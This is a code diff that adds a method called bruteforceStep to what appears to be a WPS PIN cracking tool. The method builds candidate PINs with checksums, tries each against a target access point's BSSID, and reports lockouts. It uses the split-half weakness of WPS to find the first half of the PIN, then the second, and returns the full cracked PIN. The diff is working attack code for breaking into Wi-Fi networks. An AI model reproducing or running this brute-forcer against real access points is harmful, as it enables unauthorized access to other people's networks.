@@ -174,6 +174,59 @@ class Initialize:
 
         return False
 
+    def bruteforceStep(self, bssid: str, mask: str) -> tuple[str, str | None]:
+        """Attempts exactly one pin derived from `mask` (4-digit = a
+        first-half value, 7-digit = a full first+second-half value) via
+        self._attemptPin. Makes exactly one singleConnection call — no
+        sleep, no loop, no session write; the orchestrator (not this
+        method) owns scheduling and persistence.
+
+        Returns (new_state, result):
+          - 'advanced': this attempt didn't lock or succeed; the caller
+            should try the next mask value. result is None.
+          - 'locked': the caller should record a cooldown and revisit
+            later (same mask value). result is None.
+          - 'first_half_found' (4-digit mask only): the caller should
+            switch to the 7-digit form. result is None.
+          - 'cracked' (7-digit mask only): result is the full 8-digit PIN.
+          - 'exhausted': mask was already at the end of its range.
+            result is None.
+        """
+
+        checksum = self.GENERATOR.checksum
+
+        if len(mask) == 4:
+            first_half = mask
+            t = int(first_half + '000')
+            pin = f'{first_half}000{checksum(t)}'
+            result = self._attemptPin(bssid, pin)
+
+            if result == 'locked':
+                return 'locked', None
+
+            if self.CONNECTION.CONNECTION_STATUS.isFirstHalfValid():
+                return 'first_half_found', None
+
+            if int(first_half) + 1 >= 10000:
+                return 'exhausted', None
+            return 'advanced', None
+
+        first_half = mask[:4]
+        second_half = mask[4:]
+        t = int(first_half + second_half)
+        pin = f'{first_half}{second_half}{checksum(t)}'
+        result = self._attemptPin(bssid, pin)
+
+        if result == 'locked':
+            return 'locked', None
+
+        if self.CONNECTION.CONNECTION_STATUS.LAST_M_MESSAGE > 6:
+            return 'cracked', pin
+
+        if int(second_half) + 1 >= 1000:
+            return 'exhausted', None
+        return 'advanced', None
+
     def smartBruteforce(self, bssid: str, start_pin: str = None):
         """Attempts to bruteforce a WPS PIN."""
 
